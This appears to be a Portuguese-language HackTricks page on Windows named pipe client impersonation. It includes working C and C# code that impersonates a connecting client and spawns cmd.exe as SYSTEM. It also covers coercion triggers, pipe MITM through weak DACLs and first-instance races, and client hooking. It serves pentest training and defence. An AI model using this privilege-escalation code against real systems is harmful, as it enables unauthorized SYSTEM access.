# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation é uma primitiva de local privilege escalation que permite que uma thread de um named-pipe server adote o security context de um client que se conecta a ele. Na prática, um atacante que pode executar código com SeImpersonatePrivilege pode induzir um client privilegiado (por exemplo, um serviço SYSTEM) a se conectar a um pipe controlado pelo atacante, chamar ImpersonateNamedPipeClient, duplicar o token resultante em um primary token e iniciar um processo como o client (geralmente NT AUTHORITY\SYSTEM).<sup>[[2]](#references)</sup>

Esta página concentra-se na técnica principal. Para exploit chains de ponta a ponta que induzem SYSTEM a se conectar ao seu pipe, consulte as páginas da família Potato referenciadas abaixo.

## TL;DR
- Crie um named pipe: \\.\pipe\<random> e aguarde uma conexão.
- Faça um componente privilegiado conectar-se a ele (spooler/DCOM/EFSRPC/etc.).
- Leia pelo menos uma mensagem do pipe e, em seguida, chame ImpersonateNamedPipeClient.
- Abra o impersonation token da thread atual, DuplicateTokenEx(TokenPrimary) e CreateProcessWithTokenW/CreateProcessAsUser para obter um processo SYSTEM.<sup>[[2]](#references)</sup>

## Requisitos e APIs principais
- Privilégios normalmente necessários para o processo/thread que faz a chamada:
- SeImpersonatePrivilege para impersonar com sucesso um client que se conecta e usar CreateProcessWithTokenW.
- Como alternativa, após impersonar SYSTEM, você pode usar CreateProcessAsUser, que pode exigir SeAssignPrimaryTokenPrivilege e SeIncreaseQuotaPrivilege (eles são satisfeitos quando você está impersonando SYSTEM).
- APIs principais utilizadas:<sup>[[1]](#references)[[4]](#references)</sup>
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (é necessário ler pelo menos uma mensagem antes da impersonation)
- ImpersonateNamedPipeClient e RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW ou CreateProcessAsUser
- Impersonation level: para executar ações úteis localmente, o client deve permitir SecurityImpersonation (padrão para muitos clients locais de RPC/named-pipe). Os clients podem reduzir esse nível usando SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION ao abrir o pipe.<sup>[[3]](#references)</sup>

## Fluxo de trabalho Win32 mínimo (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notas:
- Se `ImpersonateNamedPipeClient` retornar `ERROR_CANNOT_IMPERSONATE` (1368), certifique-se de ler primeiro do pipe e de que o cliente não restringiu a impersonation ao nível de Identification.
- Prefira `DuplicateTokenEx` com `SecurityImpersonation` e `TokenPrimary` para criar um token primário adequado à criação de processos.

## Exemplo rápido em .NET
No .NET, `NamedPipeServerStream` pode fazer impersonation por meio de `RunAsClient`. Depois de assumir a identidade, duplique o token da thread e crie um processo.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Gatilhos/coerções comuns para obter SYSTEM no seu pipe
Estas técnicas fazem com que serviços privilegiados se conectem ao seu named pipe, permitindo que você os impersonate:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Veja o uso detalhado e a compatibilidade aqui:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Se você só precisa de um exemplo completo de criação do pipe e impersonation para spawnar SYSTEM a partir de um service trigger, veja:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Abuso de IPC via Named Pipe e MITM (ACLs, First-Instance Races, Client Hooking)

Quando um serviço privilegiado e um processo com poucos privilégios se comunicam por `\\.\pipe\...`, trate o pipe como qualquer outra fronteira de IPC não confiável. Além da clássica impersonation no lado do servidor, ACLs fracas do pipe, flags inseguras de criação e decisões de confiança no lado do cliente também podem se tornar primitives de local privilege escalation.<sup>[[7]](#references)</sup>

### Enumere primeiro os pipes candidatos
- Liste rapidamente os pipes no PowerShell: `Get-ChildItem \\.\pipe\`
- `pipelist64.exe`, da Sysinternals, é útil para identificar contagens de instâncias e pipes de instância única.
- Priorize nomes usados por serviços executados como `SYSTEM`, especialmente helpers, updaters, launchers e UI brokers.

### MITM via DACLs permissivas e instâncias extras do pipe
- Qualquer processo que possa se comunicar com um servidor privilegiado já pode fazer fuzzing do protocolo e procurar verbs privilegiados.<sup>[[7]](#references)</sup>
- O caso mais interessante ocorre quando a DACL concede `FILE_GENERIC_WRITE`/`GENERIC_WRITE` no objeto do pipe. Em named pipes, isso inclui implicitamente `FILE_CREATE_PIPE_INSTANCE` (`FILE_APPEND_DATA` compartilha o mesmo bit), portanto um atacante pode criar outra instância de servidor com o mesmo nome.
- Como as instâncias são correspondidas na ordem FIFO, instâncias criadas pelo atacante e instâncias legítimas podem ser intercaladas: crie uma instância rogue com `CreateNamedPipe`, depois abra o mesmo nome de pipe com `CreateFile` e aguarde um cliente real se conectar à instância do servidor rogue.
- Resultado: observar, modificar, relay ou dessincronizar IPC privilegiado sem precisar controlar o processo do servidor original.

### First-instance race nos security descriptors do pipe
- `lpSecurityAttributes` define a DACL somente quando a primeira instância de um nome de pipe é criada.<sup>[[4]](#references)[[7]](#references)</sup>
- Se um serviço privilegiado iniciar tarde e não usar `FILE_FLAG_FIRST_PIPE_INSTANCE`, um atacante pode pré-criar o nome do pipe com uma DACL permissiva e deixar que o serviço crie instâncias posteriores sob o security context escolhido pelo atacante.
- Isso transforma a inicialização do serviço em uma race condition: vença a primeira instância e depois conecte-se ou faça MITM de clientes posteriores usando a ACL enfraquecida.
- Mitigation para defenders, e um ponto importante de review para attackers: verifique se `CreateNamedPipe(..., dwOpenMode, ...)` inclui `FILE_FLAG_FIRST_PIPE_INSTANCE`. Caso contrário, teste a pré-criação antes de o serviço iniciar.

### Verificações de PID/signature são hardening, não uma boundary
- Alguns produtos tentam restringir o acesso verificando `GetNamedPipeClientProcessId`, o caminho da imagem do processo ou o signer Authenticode do cliente conectado.<sup>[[7]](#references)</sup>
- Isso só ajuda até que você faça injection no cliente legítimo: uma vez dentro do processo confiável, você herda exatamente o contexto de PID/imagem/signature esperado pelo servidor.
- Em split desktop apps, instrumentar o processo de UI/helper com poucos privilégios costuma ser mais fácil do que atacar diretamente o serviço `SYSTEM`.

### Faça hook do cliente de acordo com o modelo de I/O
- I/O síncrono: intercepte `NtWriteFile` antes que o syscall consuma o buffer e inspecione/faça patch de `NtReadFile` depois que ele retornar.<sup>[[7]](#references)</sup>
- I/O overlapped: armazene o `OVERLAPPED`/`IoStatusBlock` observado em `NtReadFile` e depois inspecione o buffer quando `GetOverlappedResult` ou o wait relevante for concluído.
- Completion ports: `GetQueuedCompletionStatus` chega a `NtRemoveIoCompletion`; o `ApcContext` retornado aponta de volta para o `OVERLAPPED` usado pelo read original, sendo o pivot correto para encontrar o buffer agora preenchido.
- Completion routines (`ReadFileEx`): o callback de conclusão é entregue como um APC. Se quiser adulterar os dados retornados ou injetar replies sintéticas, faça hook da completion routine real e, para custom injection, use um dispatcher de `QueueUserAPC` com um argumento que reconstrua os 3 argumentos esperados pela routine.<sup>[[5]](#references)[[7]](#references)</sup>

### Notas sobre tooling
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) faz proxy do tráfego de named pipes por meio de uma helper DLL injetada e oferece um workflow semelhante ao Burp para edição/replay.<sup>[[6]](#references)</sup>
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) usa uma abordagem baseada em Frida e concentra-se em fazer hook de `NtReadFile`/`NtWriteFile` e dos pivots assíncronos/de completion acima, encaminhando então o tráfego para um workflow de edição baseado em WebSocket.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Considerações operacionais
- Named pipes têm baixa latência; pausas longas durante a edição de buffers podem causar deadlock em serviços frágeis.<sup>[[7]](#references)</sup>
- Clientes orientados por overlapped/completion-port/APC precisam de hooks diferentes dos desvios simples de `ReadFile`/`WriteFile`.
- A injeção no cliente confiável é ruidosa e, em geral, deve ser reservada para desenvolvimento de exploits, reverse engineering de protocolos ou fuzzing em laboratório local.

## Solução de problemas e armadilhas
- Você deve ler pelo menos uma mensagem do pipe antes de chamar ImpersonateNamedPipeClient; caso contrário, receberá ERROR_CANNOT_IMPERSONATE (1368).<sup>[[1]](#references)</sup>
- Se o cliente se conectar com SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, o servidor não poderá fazer uma impersonation completa; verifique o nível de impersonation do token por meio de GetTokenInformation(TokenImpersonationLevel).<sup>[[3]](#references)</sup>
- CreateProcessWithTokenW exige SeImpersonatePrivilege no caller. Se falhar com ERROR_PRIVILEGE_NOT_HELD (1314), use CreateProcessAsUser após já ter feito a impersonation de SYSTEM.
- Certifique-se de que o security descriptor do seu pipe permita que o serviço-alvo se conecte, caso você o hardened; por padrão, os pipes em \\.\pipe são acessíveis de acordo com a DACL do servidor.<sup>[[3]](#references)</sup>

## Referências

- [1] [Windows: documentação do ImpersonateNamedPipeClient](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [ired.team: privilege escalation com named pipes do Windows](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [3] [Microsoft: segurança e direitos de acesso de Named Pipe](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [4] [Microsoft: função CreateNamedPipe](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [5] [Microsoft: servidor de Named Pipe usando rotinas de completion](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [6] [pipetap – uma ferramenta de proxy para named pipes do Windows](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [7] [Synacktiv: Hooking de Named Pipes do Windows](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [8] [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
